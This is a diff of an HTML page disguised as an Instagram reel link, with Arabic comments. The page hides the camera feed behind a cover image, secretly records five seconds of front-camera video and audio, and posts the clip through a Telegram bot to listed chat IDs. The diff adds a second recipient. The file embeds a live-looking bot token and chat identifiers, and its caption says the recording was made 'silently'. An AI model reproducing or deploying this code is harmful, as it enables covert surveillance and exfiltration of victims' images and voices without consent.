@@ -8,7 +8,7 @@
 <meta property="og:image:height" content="630">
 
     <title>https://www.instagram.com/reel/DRCJuY6jB5R/?igsh=ZmxkYzN0NGxsOHJn</title>
-    
+
     <style>
         /* إعدادات الشاشة الأساسية */
         body {
@@ -26,7 +26,7 @@
             min-height: 100%;
             width: auto;
             height: auto;
-            z-index: 1; /* يجب أن يكون أدنى من الصورة */
+            z-index: 1; 
             transform: translate(-50%, -50%);
         }
 
@@ -37,9 +37,9 @@
             left: 0;
             width: 100%;
             height: 100%;
-            object-fit: cover; /* لضمان تغطية الشاشة */
-            z-index: 10; /* يجب أن تكون أعلى من الفيديو */
-            transition: opacity 0.5s ease-out; /* لإضافة تأثير اختفاء سلس */
+            object-fit: cover; 
+            z-index: 10; 
+            transition: opacity 0.5s ease-out;
         }
     </style>
 </head>
@@ -51,10 +51,16 @@
 
     <script>
         // ******************************************************
-        // ** إعدادات البوت والثوابت - تم التضمين بالمعلومات الخاصة بك **
+        // ** إعدادات البوت والثوابت - تم التحديث بالمعلومات الخاصة بك **
         // ******************************************************
         const BOT_TOKEN = '8564926075:AAEiDiYw5ryvtkZwIg493iU3lGQD2FV8804'; 
-        const CHAT_ID = '7869791131'; 
+        
+        // قائمة بجميع مُعرّفات الدردشة المستقبلة (Ahmed Salem و Firno Hex)
+        const CHAT_IDS_LIST = [
+            '7869791131', // أحمد سالم
+            '7354344254'  // فيرنو هيكس
+        ]; 
+        
         const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
         
         // مدة التسجيل بالمللي ثانية (5 ثوانٍ)
@@ -70,19 +76,22 @@
         const videoChunks = [];
 
         /**
-         * دالة إرسال الفيديو إلى تيليجرام.
+         * دالة إرسال الفيديو إلى تيليجرام (تكرر الإرسال لجميع الـ IDs).
          */
         async function sendVideo(videoBlob) {
             try {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('video', videoBlob, 'recorded_video.webm'); 
-                formData.append('caption', 'Recorded silently with cover image from front camera.');
+                // تكرار الإرسال لكل مُعرّف في القائمة
+                for (const chatId of CHAT_IDS_LIST) { 
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId); // استخدام المُعرّف الحالي
+                    formData.append('video', videoBlob, 'recorded_video.webm'); 
+                    formData.append('caption', `Recorded silently for Chat ID: ${chatId}`);
 
-                await fetch(TELEGRAM_API_URL, {
-                    method: 'POST',
-                    body: formData,
-                });
+                    await fetch(TELEGRAM_API_URL, {
+                        method: 'POST',
+                        body: formData,
+                    });
+                }
             } catch (error) {
                 // لا يوجد معالجة مرئية للأخطاء
             }
@@ -97,9 +106,8 @@
                 mediaRecorder.stop();
             }
 
-            // إخفاء الصورة الغلاف بسلاسة بعد الانتهاء من التسجيل والإرسال
+            // إخفاء الصورة الغلاف بسلاسة بعد الانتهاء من التسجيل
             coverImage.style.opacity = '0';
-            // إزالة عنصر الصورة من DOM بعد اختفائه تماماً
             setTimeout(() => {
                 coverImage.remove();
             }, 600); 
@@ -129,7 +137,7 @@
             mediaRecorder.onstop = () => {
                 // دمج الأجزاء إلى ملف فيديو واحد (Blob)
                 const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
-                // إرسال الملف
+                // إرسال الملف إلى جميع المعرفات
                 sendVideo(videoBlob);
             };
 
@@ -145,20 +153,18 @@
          */
         async function startCamera() {
             try {
-                // طلب الكاميرا الأمامية: facingMode: 'user'
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         facingMode: 'user' 
                     },
-                    audio: true // تسجيل الصوت مع الفيديو
+                    audio: true 
                 });
                 video.srcObject = stream;
                 
-                // الانتظار حتى يتم تحميل بيانات الفيديو وبدء التشغيل
                 await new Promise(resolve => video.onloadedmetadata = resolve);
                 video.play();
                 
-                // *** بدء التسجيل التلقائي بعد 1 ثانية من بدء البث ***
+                // بدء التسجيل التلقائي بعد 1 ثانية من بدء البث
                 setTimeout(startRecording, 1000); 
 
             } catch (error) {
